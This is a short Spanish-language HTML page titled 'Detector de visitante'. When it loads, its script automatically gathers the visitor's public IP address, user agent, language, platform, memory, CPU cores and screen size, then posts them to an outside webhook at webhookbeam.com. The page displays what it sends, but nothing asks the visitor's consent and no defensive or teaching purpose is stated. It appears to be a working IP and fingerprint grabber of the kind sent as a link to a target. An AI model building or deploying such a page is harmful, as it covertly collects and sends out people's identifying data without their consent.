<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Detector de visitante</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: sans-serif;
      padding: 1em;
    }
    pre {
      background: #f4f4f4;
      padding: 1em;
      white-space: pre-wrap;
      border: 1px solid #ccc;
    }
  </style>
</head>
<body>
  <h1>Analizando visitante...</h1>
  <pre id="log">Recolectando datos...</pre>

  <script>
    async function obtenerDatos() {
      const log = document.getElementById('log');
      try {
        const ipResp = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResp.json();

        const datos = {
          ip: ipData.ip,
          userAgent: navigator.userAgent,
          idioma: navigator.language,
          plataforma: navigator.platform,
          memoria: navigator.deviceMemory || "no disponible",
          nucleosCPU: navigator.hardwareConcurrency || "no disponible",
          anchoPantalla: screen.width,
          altoPantalla: screen.height,
          fecha: new Date().toISOString()
        };

        log.textContent = 'Enviando datos al webhook...\n\n' + JSON.stringify(datos, null, 2);

        const resp = await fetch('https://webhookbeam.com/webhook/josegaznares/ifykyk', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(datos)
        });

        const texto = await resp.text();
        log.textContent += '\n\nRespuesta del Webhook:\n' + texto;
      } catch (err) {
        log.textContent += '\n\nError al enviar datos:\n' + err;
      }
    }

    obtenerDatos();
  </script>
</body>
</html>
